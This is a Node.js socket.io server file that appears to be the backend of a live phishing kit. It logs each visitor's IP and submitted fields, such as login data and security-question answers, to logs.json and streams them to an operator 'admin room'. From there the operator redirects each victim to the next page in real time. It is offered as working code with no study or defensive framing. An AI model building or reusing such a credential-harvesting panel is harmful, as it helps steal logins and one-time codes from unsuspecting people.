const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");

const LOG_FILE = path.join(__dirname, "logs.json");

const app = express();
const server = http.createServer(app);
app.set("trust proxy", true);

const io = new Server(server, {
  cors: { origin: "*" },
});

const sessions = new Map();
let totalVisits = 0;
const admins = new Set();

function emitDashboardStats() {
  const totalUsers = sessions.size;

  const totalOnlineUsers = [...sessions.values()].filter((s) => s.online).length;

  io.to("admin_room").emit("dashboard_stats", {
    totalUsers,
    totalVisits,
    totalOnlineUsers,
    totalHandlers: admins.size,
  });
}

if (fs.existsSync(LOG_FILE)) {
  const saved = JSON.parse(fs.readFileSync(LOG_FILE));
  for (const key in saved) {
    sessions.set(key, saved[key]);
  }
}

function saveLogsToFile() {
  const data = Object.fromEntries(sessions);
  fs.writeFileSync(LOG_FILE, JSON.stringify(data, null, 2));
}

io.on("connection", (socket) => {
  // USER REGISTRATION
  socket.on("register_user", (existingSessionId) => {
    let sessionId = existingSessionId;

    // Extract IP safely
    const req = socket.request;
    const ipAddress = req.headers["x-forwarded-for"]
      ? req.headers["x-forwarded-for"].split(",")[0].trim()
      : req.socket.remoteAddress;

    if (!sessionId) {
      sessionId = uuidv4();
    }

    if (!sessions.has(sessionId)) {
      sessions.set(sessionId, {
        status: "idle",
        online: true,
        onlineStatus: "online",
        ip: ipAddress,
        lastUpdate: Date.now(),
      });
    } else {
      const session = sessions.get(sessionId);
      session.online = true;
      session.ip = ipAddress;
    }

    socket.join(`session_${sessionId}`);
    socket.data.sessionId = sessionId;

    socket.emit("session_assigned", { sessionId });
    
    io.to("admin_room").emit("user_updated", {
      sessionId,
      session: sessions.get(sessionId),
    });

    if (!existingSessionId) {
      totalVisits++;
    }

    emitDashboardStats();   
    console.log(`User-${sessionId} connected`);
  });

  // TRACK ONLINE STATUS
  socket.on("disconnect", () => {
    if (socket.data.isAdmin) {
      admins.delete(socket.id);
    }
    
    const sessionId = socket.data.sessionId;
    if (!sessionId) return;

    if (sessions.has(sessionId)) {
      sessions.get(sessionId).online = false;

      io.to("admin_room").emit("user_offline", {
        sessionId,
      });

      console.log(`User-${sessionId} disconnected`);
    }
    saveLogsToFile();
    emitDashboardStats();
  });

  // ADMIN CONNECT
  socket.on("register_admin", () => {
    socket.join("admin_room");

    admins.add(socket.id);
    socket.data.isAdmin = true;

    emitDashboardStats();
    
    for (const [sessionId, session] of sessions.entries()) {
      socket.emit("user_updated", {
        sessionId,
        session,
      });
    }
    
    console.log("Admin connected");
  });

  // HANDLE LOG SUBMISSION
  socket.on("user_update", (payload) => {
    const sessionId = socket.data.sessionId;
    if (!sessionId) return;

    if (!sessions.has(sessionId)) {
      sessions.set(sessionId, {
        id: sessionId,
        online: true,
        status: "login submitted",
        questions: [],
        lastUpdate: Date.now(),
      });
    }

    const { highlightFields = [], ...fields } = payload;
    const session = sessions.get(sessionId);

    Object.keys(fields).forEach((key) => {
      session[key] = fields[key];
    });

    // Merge simple fields
    Object.keys(payload).forEach((key) => {
      // If it's questions array, append instead of overwrite
      if (key === "questions" && Array.isArray(payload.questions)) {
        session.questions = [...(session.questions || []), ...payload.questions];
      } else {
        session[key] = payload[key];
      }
    });

    session.lastUpdate = Date.now();

    io.to("admin_room").emit("user_updated", {
      sessionId,
      session,
      highlightFields,
      highlight: true
    });
    saveLogsToFile();
  });


  // ADMIN DECIDES NEXT PAGE
  socket.on("admin_redirect", ({ sessionId, nextPage }) => {
    if (!sessions.has(sessionId)) {
      console.log("Attempted redirect for missing session:", sessionId);
      return;
    }

    const room = `session_${sessionId}`;

    sessions.get(sessionId).status = "redirected";

    io.to(room).emit("redirect_user", { nextPage });

    console.log("Redirecting user:", sessionId, nextPage);
  });
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

